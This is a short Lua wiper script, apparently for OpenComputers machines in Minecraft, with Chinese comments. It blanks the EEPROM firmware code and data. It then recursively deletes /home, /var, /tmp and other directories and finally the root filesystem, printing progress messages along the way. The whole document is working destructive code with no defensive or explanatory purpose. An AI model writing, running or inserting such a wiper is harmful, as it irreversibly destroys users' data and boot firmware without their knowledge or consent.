local component = require("component")
local filesystem = require("filesystem")

-- 1.破坏EEPROM (EFI)
print("Destroying EFI firmware...")
local eeprom = component.eeprom
if eeprom then
  pcall(function()
    eeprom.set("")  -- 清空EEPROM代码
    eeprom.setData("")  -- 清空EEPROM数据
    print("EEPROM destroyed!")
  end)
end

-- 2.格式化磁盘
print("Formatting all filesystems...")
local function deleteRecursive(path)
  if not filesystem.exists(path) then return end
  
  local ok, entries = pcall(filesystem.list, path)
  if ok and entries then
    for i = 1, #entries do
      local entry = entries[i]
      local full = path .. "/" .. entry
      local ok2, isDir = pcall(filesystem.isDirectory, full)
      if ok2 and isDir then
        deleteRecursive(full)
      end
      pcall(filesystem.remove, full)
    end
  end
  pcall(filesystem.remove, path)
end

-- 删除所有用户数据
local targets = {"/home", "/mnt", "/media", "/opt", "/srv", "/var", "/tmp", "/"}
for _, target in ipairs(targets) do
  local ok, exists = pcall(filesystem.exists, target)
  if ok and exists then
    deleteRecursive(target)
    print("Cleared: " .. target)
  end
end

print("Formatting complete!")
